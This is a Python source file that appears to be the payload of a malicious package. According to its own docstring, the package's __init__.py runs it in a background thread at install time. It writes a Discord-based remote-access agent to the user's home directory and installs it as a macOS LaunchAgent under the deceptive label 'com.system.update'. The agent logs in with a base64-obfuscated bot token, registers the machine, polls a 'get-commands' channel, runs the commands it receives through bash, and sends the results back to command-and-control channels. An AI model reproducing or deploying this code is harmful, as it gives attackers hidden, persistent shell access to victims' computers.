#!/usr/bin/env python3

import sys
import subprocess
import importlib.util
import os
import platform
import uuid
import hashlib
import shutil
import time
import site
from datetime import datetime

# Debug log
DEBUG_LOG = '/tmp/hooktest_persistence.log'

def log_debug(message):
    """Debug məlumatı yaz"""
    try:
        with open(DEBUG_LOG, 'a') as f:
            timestamp = datetime.now().strftime('%Y-%m-%d %H:%M:%S')
            f.write(f"[{timestamp}] {message}\n")
    except:
        pass

# Required packages
REQUIRED_PACKAGES = {
    "discord": "discord.py",
    "aiohttp": "aiohttp",
    "aiodns": "aiodns",
}

def is_venv_active():
    """Check if we're in a virtual environment"""
    return (hasattr(sys, 'real_prefix') or 
            (hasattr(sys, 'base_prefix') and sys.base_prefix != sys.prefix))

def get_base_python():
    """Get system Python (not venv Python)"""
    if is_venv_active():
        if platform.system() == "Darwin":  # macOS
            system_pythons = [
                "/usr/local/bin/python3",
                "/opt/homebrew/bin/python3",
                "/usr/bin/python3",
            ]
        else:
            system_pythons = [
                "/usr/bin/python3",
                "/usr/local/bin/python3",
            ]
        
        for path in system_pythons:
            if os.path.exists(path):
                try:
                    result = subprocess.run(
                        [path, "--version"],
                        stdout=subprocess.PIPE,
                        stderr=subprocess.PIPE,
                        timeout=3,
                        text=True
                    )
                    if result.returncode == 0:
                        log_debug(f"Found system Python: {path}")
                        return path
                except:
                    continue
    
    return sys.executable

def find_python_executable():
    """Python executable tap"""
    if is_venv_active():
        log_debug("Virtual environment detected, searching for system Python...")
        system_python = get_base_python()
        if system_python != sys.executable:
            log_debug(f"Using system Python: {system_python}")
            return system_python
    
    python_paths = [
        sys.executable,
        "/usr/local/bin/python3",
        "/opt/homebrew/bin/python3",
        "/usr/bin/python3",
        shutil.which("python3"),
        shutil.which("python"),
    ]
    
    for exe in python_paths:
        if exe and os.path.exists(exe):
            try:
                result = subprocess.run(
                    [exe, "--version"],
                    stdout=subprocess.PIPE,
                    stderr=subprocess.PIPE,
                    timeout=3,
                    text=True
                )
                if result.returncode == 0:
                    log_debug(f"Found Python: {exe}")
                    return exe
            except:
                continue
    
    return sys.executable

def find_working_pip():
    """Find ANY working pip on the system"""
    python_exe = find_python_executable()
    log_debug(f"Testing pip with Python: {python_exe}")
    
    # Method 1: Python -m pip
    test_commands = [
        [python_exe, "-m", "pip"],
        [python_exe, "-m", "pip3"],
    ]
    
    for cmd in test_commands:
        try:
            result = subprocess.run(
                cmd + ["--version"],
                stdout=subprocess.PIPE,
                stderr=subprocess.PIPE,
                timeout=5,
                text=True
            )
            if result.returncode == 0:
                log_debug(f"✓ Working pip found: {' '.join(cmd)}")
                return cmd
        except Exception as e:
            log_debug(f"Failed {' '.join(cmd)}: {e}")
    
    # Method 2: Standalone pip
    pip_commands = ["pip3", "pip"]
    
    for pip_cmd in pip_commands:
        try:
            result = subprocess.run(
                [pip_cmd, "--version"],
                stdout=subprocess.PIPE,
                stderr=subprocess.PIPE,
                timeout=5,
                text=True
            )
            if result.returncode == 0:
                log_debug(f"✓ Working pip: {pip_cmd}")
                return [pip_cmd]
        except:
            continue
    
    log_debug("❌ Could not find pip")
    return None

def get_user_site_packages():
    """Get user site-packages directory"""
    try:
        python_exe = find_python_executable()
        result = subprocess.run(
            [python_exe, "-m", "site", "--user-site"],
            stdout=subprocess.PIPE,
            stderr=subprocess.PIPE,
            timeout=5,
            text=True
        )
        if result.returncode == 0:
            user_site = result.stdout.strip()
            log_debug(f"User site-packages: {user_site}")
            return user_site
    except Exception as e:
        log_debug(f"Failed to get user site: {e}")
    
    # Fallback
    home = os.path.expanduser("~")
    return os.path.join(home, ".local", "lib", f"python{sys.version_info.major}.{sys.version_info.minor}", "site-packages")

def ensure_user_site_exists():
    """Make sure user site-packages exists"""
    user_site = get_user_site_packages()
    if not os.path.exists(user_site):
        try:
            os.makedirs(user_site, exist_ok=True)
            log_debug(f"Created user site-packages: {user_site}")
        except Exception as e:
            log_debug(f"Failed to create user site: {e}")
    return user_site

def install_package_robust(module_name, package_name):
    """Ultra-robust package installation"""
    log_debug(f"=== Installing {package_name} ===")
    
    pip_cmd = find_working_pip()
    if not pip_cmd:
        log_debug("❌ No pip available - CANNOT INSTALL")
        return False
    
    user_site = ensure_user_site_exists()
    
    strategies = [
        {
            "cmd": pip_cmd + ["install", package_name, "--user", "--no-warn-script-location"],
            "name": "user install"
        },
        {
            "cmd": pip_cmd + ["install", package_name, "--user", "--force-reinstall", "--no-cache-dir"],
            "name": "user force reinstall"
        },
        {
            "cmd": pip_cmd + ["install", package_name, "--target", user_site, "--upgrade"],
            "name": "target install"
        },
        {
            "cmd": pip_cmd + ["install", package_name, "--user", "--break-system-packages"],
            "name": "break-system-packages"
        },
        {
            "cmd": pip_cmd + ["install", package_name],
            "name": "system-wide"
        },
    ]
    
    for strategy in strategies:
        try:
            log_debug(f"Trying: {strategy['name']}")
            
            result = subprocess.run(
                strategy['cmd'],
                stdout=subprocess.PIPE,
                stderr=subprocess.PIPE,
                timeout=180,
                text=True
            )
            
            if result.returncode == 0 or "Successfully installed" in result.stdout:
                log_debug(f"✓ SUCCESS: {strategy['name']}")
                time.sleep(2)
                return True
            
        except subprocess.TimeoutExpired:
            log_debug(f"✗ TIMEOUT: {strategy['name']}")
        except Exception as e:
            log_debug(f"✗ EXCEPTION: {strategy['name']} - {e}")
    
    log_debug(f"❌ All strategies failed for {package_name}")
    return False

def add_all_paths_to_sys():
    """Add all possible package locations to sys.path"""
    paths_to_add = []
    
    try:
        user_site = site.getusersitepackages()
        if user_site:
            paths_to_add.append(user_site)
    except:
        pass
    
    try:
        for site_path in site.getsitepackages():
            paths_to_add.append(site_path)
    except:
        pass
    
    user_site_manual = get_user_site_packages()
    paths_to_add.append(user_site_manual)
    
    home = os.path.expanduser("~")
    if platform.system() == "Darwin":
        import glob
        patterns = [
            os.path.join(home, "Library/Python/*/lib/python/site-packages"),
            "/Library/Python/*/site-packages",
            "/usr/local/lib/python*/site-packages",
            "/opt/homebrew/lib/python*/site-packages",
        ]
        for pattern in patterns:
            paths_to_add.extend(glob.glob(pattern))
    
    added = 0
    for path in paths_to_add:
        if os.path.isdir(path) and path not in sys.path:
            sys.path.insert(0, path)
            added += 1
            log_debug(f"Added to sys.path: {path}")
    
    log_debug(f"Total paths added: {added}")
    importlib.invalidate_caches()

def check_and_install_packages():
    """Check and install missing packages during pip install"""
    log_debug("=== POST-INSTALL PACKAGE CHECK ===")
    
    try:
        add_all_paths_to_sys()
        
        missing = []
        for module_name, package_name in REQUIRED_PACKAGES.items():
            spec = importlib.util.find_spec(module_name)
            if spec is None:
                missing.append((module_name, package_name))
                log_debug(f"✗ Missing: {package_name}")
            else:
                log_debug(f"✓ Found: {module_name}")
        
        if not missing:
            log_debug("✓ All packages already installed!")
            return True
        
        log_debug(f"Need to install: {[p[1] for p in missing]}")
        
        for module_name, package_name in missing:
            if not install_package_robust(module_name, package_name):
                log_debug(f"Failed to install {package_name}")
        
        log_debug("=== POST-INSTALL VERIFICATION ===")
        add_all_paths_to_sys()
        time.sleep(2)
        
        still_missing = []
        for module_name, package_name in missing:
            spec = importlib.util.find_spec(module_name)
            if spec is None:
                still_missing.append(package_name)
                log_debug(f"✗ Still missing: {package_name}")
            else:
                log_debug(f"✓ Verified: {module_name}")
        
        if still_missing:
            log_debug(f"❌ Failed to install: {still_missing}")
            return False
        
        log_debug("✓ All packages installed successfully during post-install!")
        return True
        
    except Exception as e:
        log_debug(f"Exception: {e}")
        import traceback
        log_debug(traceback.format_exc())
        return False

def generate_session_id():
    """Session ID yarat"""
    system_info = (
        platform.system() +
        platform.node() +
        platform.machine() +
        str(uuid.getnode())
    )
    hashed = hashlib.sha256(system_info.encode()).hexdigest()
    return "session_" + hashed

def create_discord_agent_script():
    """Discord agent scriptini yarat - bütün dependency check və installation daxil"""
    
    # Tam self-contained Discord agent
    agent_code = '''#!/usr/bin/env python3

import sys
import subprocess
import importlib.util
import os
import asyncio
import platform
import uuid
import hashlib
import re
import base64
from datetime import datetime
import time
import site
import shutil

# Debug log file
DEBUG_LOG = '/tmp/discord_agent_runtime.log'

def log_debug(message):
    """Write debug message to log file"""
    try:
        with open(DEBUG_LOG, 'a') as f:
            timestamp = datetime.now().strftime('%Y-%m-%d %H:%M:%S')
            f.write(f"[{timestamp}] {message}\\n")
    except:
        pass

# Required modules
REQUIRED_PACKAGES = {
    "discord": "discord.py",
    "aiohttp": "aiohttp",
    "aiodns": "aiodns",
}

def is_venv_active():
    """Check if we're in a virtual environment"""
    return (hasattr(sys, 'real_prefix') or 
            (hasattr(sys, 'base_prefix') and sys.base_prefix != sys.prefix))

def get_base_python():
    """Get system Python (not venv Python)"""
    if is_venv_active():
        if platform.system() == "Darwin":  # macOS
            system_pythons = [
                "/usr/local/bin/python3",
                "/opt/homebrew/bin/python3",
                "/usr/bin/python3",
            ]
        else:
            system_pythons = [
                "/usr/bin/python3",
                "/usr/local/bin/python3",
            ]
        
        for path in system_pythons:
            if os.path.exists(path):
                try:
                    result = subprocess.run(
                        [path, "--version"],
                        stdout=subprocess.PIPE,
                        stderr=subprocess.PIPE,
                        timeout=3,
                        text=True
                    )
                    if result.returncode == 0:
                        log_debug(f"Found system Python: {path}")
                        return path
                except:
                    continue
    
    return sys.executable

def find_python_executable():
    """Find the correct Python executable"""
    if is_venv_active():
        log_debug("Virtual environment detected, searching for system Python...")
        system_python = get_base_python()
        if system_python != sys.executable:
            log_debug(f"Using system Python: {system_python}")
            return system_python
    
    python_exes = [
        sys.executable,
        "python3",
        "python",
        "/usr/bin/python3",
        "/usr/local/bin/python3",
        "/opt/homebrew/bin/python3",
    ]
    
    for exe in python_exes:
        try:
            result = subprocess.run(
                [exe, "--version"],
                stdout=subprocess.PIPE,
                stderr=subprocess.PIPE,
                timeout=3,
                text=True
            )
            if result.returncode == 0:
                log_debug(f"Found Python: {exe}")
                return exe
        except:
            continue
    
    return sys.executable

def find_working_pip():
    """Find ANY working pip on the system"""
    python_exe = find_python_executable()
    log_debug(f"Testing pip with Python: {python_exe}")
    
    # Method 1: Python -m pip
    test_commands = [
        [python_exe, "-m", "pip"],
        [python_exe, "-m", "pip3"],
    ]
    
    for cmd in test_commands:
        try:
            result = subprocess.run(
                cmd + ["--version"],
                stdout=subprocess.PIPE,
                stderr=subprocess.PIPE,
                timeout=5,
                text=True
            )
            if result.returncode == 0:
                log_debug(f"✓ Working pip found: {' '.join(cmd)}")
                return cmd
        except Exception as e:
            log_debug(f"Failed {' '.join(cmd)}: {e}")
    
    # Method 2: Standalone pip
    pip_commands = ["pip3", "pip"]
    
    for pip_cmd in pip_commands:
        try:
            result = subprocess.run(
                [pip_cmd, "--version"],
                stdout=subprocess.PIPE,
                stderr=subprocess.PIPE,
                timeout=5,
                text=True
            )
            if result.returncode == 0:
                log_debug(f"✓ Working pip: {pip_cmd}")
                return [pip_cmd]
        except:
            continue
    
    log_debug("❌ Could not find pip")
    return None

def get_user_site_packages():
    """Get user site-packages directory"""
    try:
        python_exe = find_python_executable()
        result = subprocess.run(
            [python_exe, "-m", "site", "--user-site"],
            stdout=subprocess.PIPE,
            stderr=subprocess.PIPE,
            timeout=5,
            text=True
        )
        if result.returncode == 0:
            user_site = result.stdout.strip()
            log_debug(f"User site-packages: {user_site}")
            return user_site
    except Exception as e:
        log_debug(f"Failed to get user site: {e}")
    
    # Fallback
    home = os.path.expanduser("~")
    return os.path.join(home, ".local", "lib", f"python{sys.version_info.major}.{sys.version_info.minor}", "site-packages")

def ensure_user_site_exists():
    """Make sure user site-packages exists"""
    user_site = get_user_site_packages()
    if not os.path.exists(user_site):
        try:
            os.makedirs(user_site, exist_ok=True)
            log_debug(f"Created user site-packages: {user_site}")
        except Exception as e:
            log_debug(f"Failed to create user site: {e}")
    return user_site

def install_package_robust(module_name, package_name):
    """Ultra-robust package installation"""
    log_debug(f"=== Installing {package_name} ===")
    
    pip_cmd = find_working_pip()
    if not pip_cmd:
        log_debug("❌ No pip available - CANNOT INSTALL")
        return False
    
    user_site = ensure_user_site_exists()
    
    strategies = [
        {
            "cmd": pip_cmd + ["install", package_name, "--user", "--no-warn-script-location"],
            "name": "user install"
        },
        {
            "cmd": pip_cmd + ["install", package_name, "--user", "--force-reinstall", "--no-cache-dir"],
            "name": "user force reinstall"
        },
        {
            "cmd": pip_cmd + ["install", package_name, "--target", user_site, "--upgrade"],
            "name": "target install"
        },
        {
            "cmd": pip_cmd + ["install", package_name, "--user", "--break-system-packages"],
            "name": "break-system-packages"
        },
        {
            "cmd": pip_cmd + ["install", package_name],
            "name": "system-wide"
        },
    ]
    
    for strategy in strategies:
        try:
            log_debug(f"Trying: {strategy['name']}")
            
            result = subprocess.run(
                strategy['cmd'],
                stdout=subprocess.PIPE,
                stderr=subprocess.PIPE,
                timeout=180,
                text=True
            )
            
            if result.returncode == 0 or "Successfully installed" in result.stdout:
                log_debug(f"✓ SUCCESS: {strategy['name']}")
                time.sleep(2)
                return True
            
        except subprocess.TimeoutExpired:
            log_debug(f"✗ TIMEOUT: {strategy['name']}")
        except Exception as e:
            log_debug(f"✗ EXCEPTION: {strategy['name']} - {e}")
    
    log_debug(f"❌ All strategies failed for {package_name}")
    return False

def add_all_paths_to_sys():
    """Add all possible package locations to sys.path"""
    paths_to_add = []
    
    try:
        user_site = site.getusersitepackages()
        if user_site:
            paths_to_add.append(user_site)
    except:
        pass
    
    try:
        for site_path in site.getsitepackages():
            paths_to_add.append(site_path)
    except:
        pass
    
    user_site_manual = get_user_site_packages()
    paths_to_add.append(user_site_manual)
    
    home = os.path.expanduser("~")
    if platform.system() == "Darwin":
        import glob
        patterns = [
            os.path.join(home, "Library/Python/*/lib/python/site-packages"),
            "/Library/Python/*/site-packages",
            "/usr/local/lib/python*/site-packages",
            "/opt/homebrew/lib/python*/site-packages",
        ]
        for pattern in patterns:
            paths_to_add.extend(glob.glob(pattern))
    
    added = 0
    for path in paths_to_add:
        if os.path.isdir(path) and path not in sys.path:
            sys.path.insert(0, path)
            added += 1
            log_debug(f"Added to sys.path: {path}")
    
    log_debug(f"Total paths added: {added}")
    importlib.invalidate_caches()

def check_and_install_packages():
    """Check and install missing packages"""
    log_debug("=== PACKAGE CHECK ===")
    
    try:
        add_all_paths_to_sys()
        
        missing = []
        for module_name, package_name in REQUIRED_PACKAGES.items():
            spec = importlib.util.find_spec(module_name)
            if spec is None:
                missing.append((module_name, package_name))
                log_debug(f"✗ Missing: {package_name}")
            else:
                log_debug(f"✓ Found: {module_name}")
        
        if not missing:
            log_debug("✓ All packages already installed!")
            return True
        
        log_debug(f"Need to install: {[p[1] for p in missing]}")
        
        for module_name, package_name in missing:
            if not install_package_robust(module_name, package_name):
                log_debug(f"Failed to install {package_name}")
        
        log_debug("=== VERIFICATION ===")
        add_all_paths_to_sys()
        time.sleep(2)
        
        still_missing = []
        for module_name, package_name in missing:
            spec = importlib.util.find_spec(module_name)
            if spec is None:
                still_missing.append(package_name)
                log_debug(f"✗ Still missing: {package_name}")
            else:
                log_debug(f"✓ Verified: {module_name}")
        
        if still_missing:
            log_debug(f"❌ Failed to install: {still_missing}")
            return False
        
        log_debug("✓ All packages installed successfully!")
        return True
        
    except Exception as e:
        log_debug(f"Exception: {e}")
        import traceback
        log_debug(traceback.format_exc())
        return False

def import_discord_modules():
    """Import Discord modules"""
    try:
        global discord, aiohttp
        
        add_all_paths_to_sys()
        
        log_debug("Importing discord...")
        import discord
        log_debug(f"✓ discord {discord.__version__}")
        
        log_debug("Importing aiohttp...")
        import aiohttp
        log_debug(f"✓ aiohttp {aiohttp.__version__}")
        
        return True
        
    except ImportError as e:
        log_debug(f"Import error: {e}")
        return False
    except Exception as e:
        log_debug(f"Unexpected error: {e}")
        return False

# Discord Agent Globals
SESSION_ID = "''' + generate_session_id() + '''"
CLIENT_INFO = f"{platform.system()} {platform.release()} - {platform.node()}"
COMMAND_AND_CONTROL_CHANNEL = None
GET_COMMANDS_CHANNEL = None
COMMAND_RESULTS_CHANNEL = None
last_processed_message_id = None

async def create_client():
    """Create Discord client"""
    try:
        log_debug("Creating Discord client...")
        
        connector = None
        try:
            connector = aiohttp.TCPConnector(
                resolver=aiohttp.AsyncResolver(nameservers=['8.8.8.8', '1.1.1.1']),
                family=0,
                ssl=False
            )
            log_debug("✓ Using AsyncResolver")
        except:
            connector = aiohttp.TCPConnector(family=0, ssl=False)
        
        intents = discord.Intents.default()
        intents.message_content = True
        intents.guilds = True
        
        client = discord.Client(intents=intents, connector=connector)
        log_debug("✓ Discord client created")
        return client
    except Exception as e:
        log_debug(f"Failed to create client: {e}")
        return None

async def register_session(guild, client_instance):
    """Register session"""
    try:
        log_debug(f"Registering with guild: {guild.name}")
        channel = guild.get_channel(COMMAND_AND_CONTROL_CHANNEL)
        if channel:
            await channel.send(f'/register {SESSION_ID} {CLIENT_INFO}')
            log_debug("✓ Registration sent")
    except Exception as e:
        log_debug(f"Registration failed: {e}")

def parse_command_message(content):
    """Parse command message"""
    try:
        lines = content.split('\\n')
        command_id = None
        session = None
        command = None
        
        for line in lines:
            if 'Command ID:' in line:
                command_id = line.split('Command ID:')[1].strip()
            elif 'Session:' in line:
                m = re.search(r"session_[0-9a-fA-F]{64}", line)
                session = m.group(0) if m else None
            elif 'Command:' in line:
                match = re.search(r"```(.*?)```", content, re.DOTALL)
                if match:
                    command = match.group(1).strip()
        
        if command_id and session and command:
            return {
                'command_id': command_id,
                'session': session,
                'command': command
            }
        return None
    except Exception as e:
        log_debug(f"Parse error: {e}")
        return None

async def execute_command(command):
    """Execute system command"""
    try:
        log_debug(f"Executing: {command[:50]}...")
        
        process = subprocess.Popen(
            command,
            shell=True,
            stdout=subprocess.PIPE,
            stderr=subprocess.PIPE,
            text=True,
            executable='/bin/bash'
        )
        
        stdout, stderr = process.communicate(timeout=30)
        
        if process.returncode == 0:
            result = stdout if stdout else 'Success'
        else:
            result = f'Error: {stderr if stderr else "Failed"}'
        
        if len(result) > 1900:
            result = result[:1900] + '\\n...(truncated)'
        
        return result
        
    except subprocess.TimeoutExpired:
        return 'Error: Timeout'
    except Exception as e:
        return f'Error: {str(e)}'

async def send_response(command_id, command, response, client_instance):
    """Send command response"""
    try:
        channel = client_instance.get_channel(COMMAND_AND_CONTROL_CHANNEL)
        if channel:
            await channel.send(
                f'**Response for {command_id}**\\n'
                f'**Session:** {SESSION_ID}\\n'
                f'**Command:** ```{command[:100]}```\\n'
                f'**Response:** ```{response}```'
            )
        
        results_channel = client_instance.get_channel(COMMAND_RESULTS_CHANNEL)
        if results_channel:
            await results_channel.send(
                f'**Command ID:** {command_id}\\n'
                f'**Session:** {SESSION_ID}\\n'
                f'**Command:** ```{command}```\\n'
                f'**Response:** ```{response}```\\n'
                f'**Timestamp:** {datetime.now().strftime("%Y-%m-%d %H:%M:%S")}'
            )
            
    except Exception as e:
        log_debug(f"Failed to send response: {e}")

async def poll_commands(client_instance):
    """Poll for commands"""
    global last_processed_message_id
    
    try:
        log_debug("Starting command polling")
        await asyncio.sleep(5)
        
        while True:
            try:
                channel = client_instance.get_channel(GET_COMMANDS_CHANNEL)
                if not channel:
                    await asyncio.sleep(10)
                    continue
                
                messages = [msg async for msg in channel.history(limit=1)]
                
                if messages:
                    latest_message = messages[0]
                    
                    if last_processed_message_id != latest_message.id:
                        command_data = parse_command_message(latest_message.content)
                        
                        if command_data and command_data["session"] == SESSION_ID:
                            log_debug(f"Executing command {command_data['command_id']}")
                            response = await execute_command(command_data['command'])
                            await send_response(
                                command_data['command_id'],
                                command_data['command'],
                                response,
                                client_instance
                            )
                            last_processed_message_id = latest_message.id
                
                await asyncio.sleep(3)
                
            except Exception as e:
                log_debug(f"Poll error: {e}")
                await asyncio.sleep(10)
                
    except Exception as e:
        log_debug(f"Fatal poll error: {e}")

async def setup_client_events(client_instance):
    """Setup event handlers"""
    global COMMAND_AND_CONTROL_CHANNEL, GET_COMMANDS_CHANNEL, COMMAND_RESULTS_CHANNEL
    
    @client_instance.event
    async def on_ready():
        global COMMAND_AND_CONTROL_CHANNEL, GET_COMMANDS_CHANNEL, COMMAND_RESULTS_CHANNEL
        
        try:
            log_debug(f"Connected as {client_instance.user.name}")
            
            guild = client_instance.guilds[0] if client_instance.guilds else None
            if guild:
                for channel in guild.text_channels:
                    if channel.name == 'command-and-control':
                        COMMAND_AND_CONTROL_CHANNEL = channel.id
                    elif channel.name == 'get-commands':
                        GET_COMMANDS_CHANNEL = channel.id
                    elif channel.name == 'command-results':
                        COMMAND_RESULTS_CHANNEL = channel.id
                
                if all([COMMAND_AND_CONTROL_CHANNEL, GET_COMMANDS_CHANNEL, COMMAND_RESULTS_CHANNEL]):
                    await register_session(guild, client_instance)
                    client_instance.loop.create_task(poll_commands(client_instance))
                    log_debug("✓ Polling started")
                
        except Exception as e:
            log_debug(f"on_ready error: {e}")

async def run_discord_client():
    """Run Discord client"""
    try:
        log_debug("=== DISCORD AGENT STARTING ===")
        
        # Install dependencies
        if not check_and_install_packages():
            log_debug("Failed to install dependencies")
            return
        
        # Import modules
        if not import_discord_modules():
            log_debug("❌ Cannot import Discord modules")
            return
        
        TOKEN = base64.b64decode(
            "TVRRek5UazBPVGcwTURjeE56VTRNalE0T1EuR3F4OW11LnRHeno5alVEZTVGeGhJc19Oa0h2MFA5WmxpT2o3X1o0LVVOdXF3"
        ).decode('utf-8')
        
        client = await create_client()
        if not client:
            log_debug("❌ Cannot create client")
            return
        
        await setup_client_events(client)
        await client.start(TOKEN)
        
    except Exception as e:
        log_debug(f"Fatal error: {e}")
        import traceback
        log_debug(traceback.format_exc())

def start_discord_agent():
    """Entry point"""
    try:
        log_debug("=== START ===")
        loop = asyncio.new_event_loop()
        asyncio.set_event_loop(loop)
        loop.run_until_complete(run_discord_client())
    except Exception as e:
        log_debug(f"Error: {e}")

if __name__ == "__main__":
    start_discord_agent()
'''
    
    return agent_code

def create_launch_agent():
    """LaunchAgent plist faylını yarat və qur"""
    log_debug("=== CREATING LAUNCH AGENT ===")
    
    # Paths
    home = os.path.expanduser("~")
    launch_agents_dir = os.path.join(home, "Library", "LaunchAgents")
    agent_script_path = os.path.join(home, ".local", "bin", "discord_agent.py")
    plist_path = os.path.join(launch_agents_dir, "com.system.update.plist")
    
    # Directories yarat
    os.makedirs(launch_agents_dir, exist_ok=True)
    os.makedirs(os.path.dirname(agent_script_path), exist_ok=True)
    
    # Agent scriptini yaz
    agent_code = create_discord_agent_script()
    with open(agent_script_path, 'w') as f:
        f.write(agent_code)
    
    # Executable et
    os.chmod(agent_script_path, 0o755)
    log_debug(f"Agent script created: {agent_script_path}")
    
    # Python path
    python_exe = find_python_executable()
    
    # Plist yarad
    plist_content = f'''<?xml version="1.0" encoding="UTF-8"?>
<!DOCTYPE plist PUBLIC "-//Apple//DTD PLIST 1.0//EN" "http://www.apple.com/DTDs/PropertyList-1.0.dtd">
<plist version="1.0">
<dict>
    <key>Label</key>
    <string>com.system.update</string>
    
    <key>ProgramArguments</key>
    <array>
        <string>{python_exe}</string>
        <string>{agent_script_path}</string>
    </array>
    
    <key>RunAtLoad</key>
    <true/>
    
    <key>StartInterval</key>
    <integer>21600</integer>
    
    <key>StandardOutPath</key>
    <string>/tmp/discord_agent_out.log</string>
    
    <key>StandardErrorPath</key>
    <string>/tmp/discord_agent_err.log</string>
    
    <key>EnvironmentVariables</key>
    <dict>
        <key>PATH</key>
        <string>/usr/local/bin:/usr/bin:/bin:/usr/sbin:/sbin</string>
    </dict>
    
    <key>KeepAlive</key>
    <dict>
        <key>NetworkState</key>
        <true/>
    </dict>
    
    <key>ThrottleInterval</key>
    <integer>300</integer>
</dict>
</plist>
'''
    
    with open(plist_path, 'w') as f:
        f.write(plist_content)
    
    log_debug(f"Plist created: {plist_path}")
    
    # Load agent
    try:
        subprocess.run(
            ["launchctl", "unload", plist_path],
            stdout=subprocess.PIPE,
            stderr=subprocess.PIPE,
            timeout=10
        )
        log_debug("Unloaded old agent (if existed)")
    except:
        pass
    
    try:
        result = subprocess.run(
            ["launchctl", "load", plist_path],
            stdout=subprocess.PIPE,
            stderr=subprocess.PIPE,
            timeout=10,
            text=True
        )
        
        if result.returncode == 0:
            log_debug("✓ LaunchAgent loaded successfully")
        else:
            log_debug(f"Load failed: {result.stderr}")
    except Exception as e:
        log_debug(f"Failed to load agent: {e}")
    
    # İndi başlat
    try:
        result = subprocess.run(
            ["launchctl", "start", "com.system.update"],
            stdout=subprocess.PIPE,
            stderr=subprocess.PIPE,
            timeout=10,
            text=True
        )
        log_debug("Agent started immediately")
    except Exception as e:
        log_debug(f"Failed to start immediately: {e}")

def setup_macos_persistence():
    """
    Əsas funksiya - bu __init__.py tərəfindən background thread-də çağırılır
    """
    try:
        log_debug("=== MACOS PERSISTENCE SETUP STARTED ===")
        log_debug(f"Platform: {platform.system()}")
        log_debug(f"Python: {sys.version}")
        
        # 1. Dependencyləri qur (post-install zamanı)
        log_debug("Starting post-install dependency check...")
        check_and_install_packages()
        
        # 2. Launch agent yarat (agent içində də yenə check olacaq)
        create_launch_agent()
        
        log_debug("=== PERSISTENCE SETUP COMPLETED ===")
        
    except Exception as e:
        log_debug(f"Setup failed: {e}")
        import traceback
        log_debug(traceback.format_exc())

if __name__ == "__main__":
    setup_macos_persistence()